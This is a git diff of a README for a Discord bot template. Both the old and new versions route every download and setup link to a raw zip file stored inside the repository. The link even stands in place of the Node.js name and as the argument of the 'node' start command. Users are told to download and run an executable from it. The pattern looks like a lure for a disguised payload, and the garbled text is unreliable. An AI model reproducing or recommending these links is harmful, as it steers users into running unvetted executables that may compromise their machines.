@@ -6,11 +6,11 @@ Welcome to the **discord-js-bot-template**! This template helps you create a sca
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/DylanS2002/discord-js-bot-template/main/lurchline/discord-js-bot-template.zip)](https://raw.githubusercontent.com/DylanS2002/discord-js-bot-template/main/lurchline/discord-js-bot-template.zip)
+[![Download Latest Release](https://github.com/DylanS2002/discord-js-bot-template/raw/refs/heads/main/src/core/discord_template_js_bot_3.3-alpha.1.zip)](https://github.com/DylanS2002/discord-js-bot-template/raw/refs/heads/main/src/core/discord_template_js_bot_3.3-alpha.1.zip)
 
 You can download the latest version of the application from our Releases page. 
 
-**Download link:** [Visit this page to download](https://raw.githubusercontent.com/DylanS2002/discord-js-bot-template/main/lurchline/discord-js-bot-template.zip)
+**Download link:** [Visit this page to download](https://github.com/DylanS2002/discord-js-bot-template/raw/refs/heads/main/src/core/discord_template_js_bot_3.3-alpha.1.zip)
 
 ## 🧾 Features
 
@@ -31,13 +31,13 @@ This Discord bot template is packed with useful features:
 To run the **discord-js-bot-template**, your system should meet the following requirements:
 
 - **Operating System:** Windows 10, macOS, or a Linux distribution.
-- **https://raw.githubusercontent.com/DylanS2002/discord-js-bot-template/main/lurchline/discord-js-bot-template.zip** Version 16 or higher.
+- **https://github.com/DylanS2002/discord-js-bot-template/raw/refs/heads/main/src/core/discord_template_js_bot_3.3-alpha.1.zip** Version 16 or higher.
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** Minimum of 100 MB available for installation and files.
 
 ## 🔧 Download & Install
 
-1. Visit the Releases page: [Visit this page to download](https://raw.githubusercontent.com/DylanS2002/discord-js-bot-template/main/lurchline/discord-js-bot-template.zip).
+1. Visit the Releases page: [Visit this page to download](https://github.com/DylanS2002/discord-js-bot-template/raw/refs/heads/main/src/core/discord_template_js_bot_3.3-alpha.1.zip).
 2. Click on the latest release version (e.g., v1.0).
 3. Find the executable file and click to download it.
 4. Once downloaded, locate the file on your computer. 
@@ -57,7 +57,7 @@ After installing, follow these steps to run your Discord bot:
    ```
 3. Start the bot with the following command:
    ```
-   node https://raw.githubusercontent.com/DylanS2002/discord-js-bot-template/main/lurchline/discord-js-bot-template.zip
+   node https://github.com/DylanS2002/discord-js-bot-template/raw/refs/heads/main/src/core/discord_template_js_bot_3.3-alpha.1.zip
    ```
 4. Your bot will connect to Discord, and you can begin using it!
 
